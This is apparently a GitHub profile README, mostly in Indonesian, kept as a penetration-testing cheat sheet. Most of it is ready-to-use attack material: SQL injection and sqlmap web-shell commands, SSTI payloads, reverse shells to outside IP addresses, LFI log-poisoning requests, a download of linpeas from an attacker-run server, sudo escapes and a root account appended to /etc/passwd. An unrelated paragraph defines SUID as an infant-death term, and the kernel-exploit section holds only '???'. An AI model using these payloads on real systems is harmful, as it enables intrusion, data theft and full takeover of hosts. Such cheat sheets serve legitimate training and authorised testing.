# 👋 Hello, World!

<div align="center">

# 🚀 Survival Kit

*"Learn. Build. Break. Fix. Repeat."*

![Profile Views](https://komarev.com/ghpvc/?username=antonlepari&color=blue)
![GitHub followers](https://img.shields.io/github/followers/antonlepari?style=social)
![GitHub Stars](https://img.shields.io/github/stars/antonlepari?style=social)

</div>

<br> <br>

Ingat perintah berikut:
```bash
cd Downloads
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
python -m http.server 899

cd /tmp
wget http://69.69.69.69:899/linpeas.sh
wget http://69.69.69.69:899/linux-exploit-suggester.sh
``` 
<br> <br>

SQLi to RCE
```python
Celah yang muncul ketika aplikasi menyambung input pengguna langsung ke dalam query SQL tanpa pemisahan antara data dan kode.
Akibatnya, penyerang dapat mengubah maksud query -- membaca, memodifikasi, atau menghapus data, bahkan mengeksekusi perintah pada server.

Cara kerja:
SELECT * FROM users WHERE name = 'alice'
SELECT * FROM users WHERE name = '' OR '1'='1' --'

Tanda kutip pada input menutup string lebih awal, lalu -- mengomentari sisa query asli.
Kondisi selalu benar → seluruh baris dikembalikan.

* Boolean-based Blind
# Konteks string — tutup kutip lalu komentari
?id=1' AND 1=1-- - → benar
?id=1' AND 1=2-- - → salah

# Ekstraksi 1 karakter — varian DBMS
MySQL ' AND SUBSTRING(database(),1,1)='a'-- -
PgSQL ' AND SUBSTR(current_database(),1,1)='a'-- -
MSSQL ' AND SUBSTRING(DB_NAME(),1,1)='a'-- -
Oracle ' AND SUBSTR(user,1,1)='a'--

* Error-based
# Bocorkan data lewat pesan error
MySQL ' AND extractvalue(1,concat(0x7e,database()))-- -
PgSQL ' AND 1=cast((SELECT version()) AS int)-- -
MSSQL ' AND 1=convert(int,(SELECT db_name()))-- -
Oracle ' AND 1=utl_inaddr.get_host_name(user)-- -

* UNION-based
# 1. Cari jumlah kolom (semua DBMS)
?id=1' ORDER BY 3-- -
# 2. Ambil versi DBMS via UNION
MySQL ' UNION SELECT 1,@@version,3-- -
PgSQL ' UNION SELECT 1,version(),3-- -
MSSQL ' UNION SELECT 1,@@version,3-- -
Oracle ' UNION SELECT 1,banner,3 FROM v$version-- -

* Stacked Queries
# Dukungan & contoh per DBMS
MSSQL ✓ '; EXEC xp_cmdshell('whoami')-- -
PgSQL ✓ '; DROP TABLE users-- -
Oracle ~ terbatas — blok PL/SQL anonim
MySQL ✗ driver PHP (mysqli/PDO) menolak

admin'-- -
' OR '1'='1'-- -
sqlmap -u "http://target/page.php?id=1" --os-shell
sqlmap -u "http://target/?id=1" --os-cmd="id"

sqlmap -u "http://target/?id=1" --file-write="/local/path/shell.php" --file-dest="/var/www/html/shell.php"
sqlmap.py -u "http://192.168.1.69:6969/logs/search?q='" --file-write="C:\Users\MYUSER-FU\Downloads\shell.php" --file-dest="/var/www/html/shell.php"

Syarat: FILE privilege & path webroot absolut diketahui (mis. /var/www/html).
```
<br> <br>

SSTI to RCE
```bash
Engine menggabungkan template statis dengan data dinamis untuk menghasilkan HTML. Selama input pengguna diperlakukan sebagai data , bukan bagian dari template, semuanya aman. XSS dieksekusi di browser korban, sedangkan SSTI dieksekusi di server.

* Contoh
hello.html — template (Jinja2)

<h1>Hello, {{ name }}</h1>
# name = "Andi" (data, aman)
<h1>Hello, Andi</h1>

* Payload
{{ 7 * 7 }}
${ 7 * 7 }
<%= 7*7 %>
{{7*'7'}}
{{ lipsum.__globals__.os.popen('cat /etc/passwd' ).read()}}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ ['id']|filter('system') }}
<#assign x='freemarker.template.utility.Execute'?new()>${x('id')}
#set($e=$x.getClass().forName('java.lang.Runtime')...) .exec('id')
<%= system('id') %>
<%= system(`id`) %>

{{lipsum.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.10.12.12/43795 0>&1'").read()}}

```
<br> <br>

Reverse Shell dari Pentest Monkey (especially after Command Injecting `ping google.com;id`) 
```bash
September 4, 2011

# Python dan Python3
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.69",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.69",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Bash | this was tested on Ubuntu 10.10
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
<br> <br>

LFI to RCE
```python
....//
..././
..//
%252e%252e%252f
....//....//etc/passwd
%2e%2e%2f → ../
Null byte %00 → /etc/passwd%00.php

# Di dalam request
User-Agent: <?php system($_GET[c]);?>

GET /?page= ../../../var/log/apache2/access.log
GET /?page= ../../../var/log/apache2/access.log?c=id
GET /?page=data://text/plain,<?php+system('id');+?>
POST /?page=php://input
```
<br> <br>

# Privilege Escalation

## Kernel Exploit (Kernel LPE)
Kernel merupakan bagian inti pada sebuah OS. Berfungsi untuk mengatur/menghubungkan Software dengan Hardware. Kernel memiliki akses penuh pada OS. Eksploitasi Kernel dapat memberikan kita root shell.
```bash
???
```

## SUID
SUID (Set owner User ID) is a special Linux file permission that allows a user to execute an executable file with the permissions of the file owner rather than the user running it. <br>

SUID (Set User ID) adalah hak akses spesial di Linux yang memungkinkan pengguna biasa menjalankan suatu program atau file biner dengan hak akses pemilik (biasanya `root`) program tersebut. 

Merupakan fitur pada Linux dimana sebuah file dapat dieksekusi sebagai privilege owner dari file tersebut. Apabila terdapat file yang memiliki SUID sebagai `root`, maka siapapun yang mengeksekusi file tersebut akan berjalan dengan privilege root.
```perl
find / -perm -u=s -type f 2>/dev/null

Finding Privilege Escalation Vectors (SUID/SGID)

* Find SUID files:
find / -perm -4000 -type f 2>/dev/null

* Find SGID files:
find / -perm -2000 -type f 2>/dev/null

* Find both SUID and SGID files:
find / -perm /6000 -type f 2>/dev/null

SUID typically refers to Sudden Unexpected Infant Death, which is an umbrella term for any sudden and unexpected infant death (under 1 year of age) before or after an investigation. This category includes both explainable causes (such as accidents or suffocation) and unexplainable causes (like SIDS).
```

## SUDO
Sudo merupakan program yang mengizinkan user untuk menjalankan file/binaries dengan privilege user lain, default-nya sebagai `root`. Biasanya user perlu password ketika menjalankan `SUDO`, dan perlu dikonfigurasi pada file `/etc/sudoers`. Namun rules dapat dibatasi pada program tertentu dan dapat diatur agar tidak perlu memasukkan password.
```bash
sudo -l
# lalu cek GTFObins, lalu jalankan memakai sudo, misalnya

sudo vim -c ':!/bin/sh'                       # kalau ketemu vim
sudo less /etc/profile  -> !/bin/sh           # kalau ketemu less/more
sudo find . -exec /bin/sh \; -quit            # kalau ketemu find
sudo python3 -c 'import os;os.system("/bin/sh")'
sudo env /bin/sh
```

## Weak File Permission
Users dapat merupakan anggota dari beberapa Groups. Groups dapat terdiri dari beberapa Users. Setiap File & Dir memiliki permission tertentu untuk user dan groups.
```python
# Landasan teorinya ada pada:
Readable /etc/shadow
Writeable /etc/shadow
Writeable /etc/passwd

# karena ada kemungkinan hal tersebut, selanjutnya cek permission:
ls -la /etc/passwd /etc/shadow /etc/sudoers.d/

# kalau /etc/passwd bisa di-edit, maka lakukan Generate hash:
openssl passwd -1 -salt sukagaram passwordlemah123

# Tambah root user (pakai >> bukan >)
echo 'penjahat:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su penjahat    # -> maka diperoleh root
```

## Alur Umum

```text
Recon (nmap) → Web enum → Foothold (SQLi/upload/SSTI/LFI/cmdi)

Source: https://github.com/w4h4z/Pentest-Cheat-Sheet/
→ Reverse shell + stabilize → Enum (linpeas + manual) → GTFOBins
→ Privesc (SUID/sudo/cron/weak-perm/KERNEL dirtyfrag-copyfail) →  proof
```


* LinPEAS = https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
* LES = https://github.com/The-Z-Labs/linux-exploit-suggester
* GTFObins = https://gtfobins.org/gtfobins/
* Pentest Monkey https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
* Payload LFI = https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt
* Cek https://medium.com/fmisec/injeksi-file-access-log-untuk-eskalasi-kerentanan-lfi-ke-rce-f0fc782b960d
* Cek https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1/
* Cek https://support.scc.suse.com/s/kb/passwordless-SSH-login-to-a-remote-server-with-DSA-client-public-key-keeps-asking-user-for-password?language=en_US
* Tomcat : https://hackviser.com/tactics/pentesting/services/tomcat
* Cron Job : https://snehbavarva.medium.com/privilege-escalation-techniques-series-linux-cron-jobs-a5b797b424b4

Contekan dari sebelah:
Referensi teknik & payload:
recon → foothold → reverse shell → enumerasi → privilege escalation → proof.

Open Redirect (examples)
```bash
example.com/redirect?url=http://google.com (Allowed)
example.com/redirect?url=http://evil.com (Not Allowed)
example.com/redirect?url=http://evilgoogle.com (Allowed - Bypass!)
example.com/redirect?url=http://evil.com/?http://google.com (Allowed - Bypass!)
``` 
<br> <br>
